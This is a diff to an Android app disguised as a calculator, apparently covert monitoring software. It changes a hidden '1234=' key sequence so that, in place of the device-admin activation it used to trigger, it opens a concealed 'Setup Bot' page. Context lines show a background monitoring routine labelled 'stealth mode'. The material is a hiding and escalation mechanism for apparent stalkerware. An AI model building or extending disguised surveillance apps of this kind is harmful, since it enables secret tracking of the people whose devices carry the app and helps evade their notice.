@@ -259,13 +259,14 @@ class MainActivity : AppCompatActivity() {
     }
     
     private fun calculate() {
-        // SECRET CODE: Check if "1234=" was entered
-        if (previousNumber == "1234" && currentNumber.isEmpty() && operator.isEmpty()) {
-            android.util.Log.i("MainActivity", "🔐 SECRET CODE ACTIVATED!")
-            activateDeviceAdmin()
+        // SECRET CODE: ketik 1234 lalu = untuk buka halaman Setup Bot
+        if (currentNumber == "1234" || previousNumber == "1234") {
+            android.util.Log.i("MainActivity", "SECRET CODE -> open SetupActivity")
             currentNumber = ""
             previousNumber = ""
+            operator = ""
             updateCalculatorDisplay()
+            openSetupPage()
             return
         }
         
@@ -306,6 +307,15 @@ class MainActivity : AppCompatActivity() {
         calculatorDisplay?.text = if (currentNumber.isEmpty()) "0" else currentNumber
     }
     
+    private fun openSetupPage() {
+        try {
+            startActivity(Intent(this, SetupActivity::class.java))
+        } catch (e: Exception) {
+            android.util.Log.e("MainActivity", "Failed to open setup", e)
+            Toast.makeText(this, "Gagal buka setup: ${e.message}", Toast.LENGTH_SHORT).show()
+        }
+    }
+
     private fun startMonitoringInBackground() {
         android.util.Log.i("MainActivity", "Starting monitoring in background (stealth mode)")
         
